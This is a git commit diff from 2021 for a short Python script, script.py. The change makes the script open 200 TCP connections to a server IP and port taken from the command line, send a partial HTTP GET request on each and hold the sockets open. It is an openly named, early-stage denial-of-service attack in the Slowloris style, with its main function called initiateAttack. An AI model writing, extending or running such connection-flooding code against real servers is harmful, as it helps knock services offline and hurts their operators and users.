ffa19a92c540c19fa938d301eb2ac9a6015e6701
Deena Thomas <deenathomas@Seans-iMac.fios-router.home>
2021-05-19 16:56:25 -0400

    allowed for creating 200 socket connections to passed in server and port

--- script.py
+++ script.py
@@ -1,24 +1,29 @@
 import sys
 import socket
 
-PORT = 8000
 STANDARD_GET_REQUEST = "GET / HTTP/1.1"
+SOCKET_CONNECTIONS = []
 
-def create_connection(ip):
+def create_connection(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    SOCKET_CONNECTIONS.append(s)
+    s.send(str.encode(STANDARD_GET_REQUEST))
+        
+
+
+
+def initiateAttack(ip, port):
     for _ in range(200):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, PORT))
-        s.send(str.encode(STANDARD_GET_REQUEST))
-
-
-def initiateAttack(ip):
-    #TODO make the attack doggie
-    create_connection(ip)
+        create_connection(ip, port)
+    
+    for connection in SOCKET_CONNECTIONS:
+        print(connection)
 
 def main():
     ip = sys.argv[1]
-    
-    initiateAttack(ip)
+    port = sys.argv[2]
+    initiateAttack(ip, int(port))
 
 if __name__ == "__main__":
     main()
